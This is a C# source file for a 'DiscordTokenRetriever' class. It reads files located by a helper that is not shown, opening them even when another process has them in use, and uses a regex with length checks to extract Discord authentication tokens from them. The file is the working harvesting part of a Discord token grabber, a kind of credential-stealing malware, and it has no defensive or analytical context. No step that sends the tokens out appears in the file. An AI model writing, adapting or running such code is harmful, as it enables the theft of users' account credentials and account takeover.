using System.Text.RegularExpressions;
using System.IO;
using System.Collections.Generic;
using System.Text;
using Foundations;

namespace DiscordTokenRetriever
{
    public class TokenRetriever
    {
        //Regex used to determine if a string has the characteristics of a token.
        private static readonly Regex tokenRegex = new Regex(@"([A-Za-z0-9_\./\\-]*)");

        /// <summary>
        /// Read all lines of a specified file (even if it's being used by another process)
        /// </summary>
        /// <param name="file"></param>
        /// <returns></returns>
        private static List<string> ReadAllLines(string file)
        {
            var lines = new List<string>();
            using (FileStream fileStream = File.Open(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
            {
                using (StreamReader streamReader = new StreamReader(fileStream, Encoding.Default))
                {
                    while (streamReader.Peek() >= 0)
                        lines.Add(streamReader.ReadLine());
                }
            }

            return lines;
        }

        /// <summary>
        /// Regex checks a line for potential tokens and return any if found.
        /// </summary>
        /// <param name="line"></param>
        /// <returns></returns>
        private static string TokenRegexCheck(string line)
        {
            MatchCollection regexMatches = tokenRegex.Matches(line);
            foreach (Match match in regexMatches)
            {
                GroupCollection groupedMatches = match.Groups;
                var groupValue = groupedMatches[0].Value;
                if (groupValue.Length == 59 || groupValue.Length == 88)
                    return groupValue;
            }
            return "";
        }

        /// <summary>
        /// Check for all possible occurences of tokens and return them if any are found.
        /// </summary>
        /// <param name="line"></param>
        /// <returns></returns>
        private static string PerformTokenCheck(string line)
        {
            if (line.Contains("[oken"))
                return TokenRegexCheck(line);

            if (line.Contains(">oken"))
                return TokenRegexCheck(line);

            if (line.Contains("token>"))
                return TokenRegexCheck(line);

            return "";
        }

        /// <summary>
        /// Retrieve all discord tokens within your system and return them as a list.
        /// </summary>
        /// <returns></returns>
        public static List<string> RetrieveDiscordTokens()
        {
            var locatedTokens = new List<string>();
            var tokenFileLocations = Utilities.RetrieveAllTokenFiles();
            foreach (var tokenFile in tokenFileLocations)
            {
                var fileContent = ReadAllLines(tokenFile);
                foreach (var line in fileContent)
                {
                    if (PerformTokenCheck(line) == "")
                        continue;

                    locatedTokens.Add(PerformTokenCheck(line));
                }
            }

            return locatedTokens;
        }
    }
}
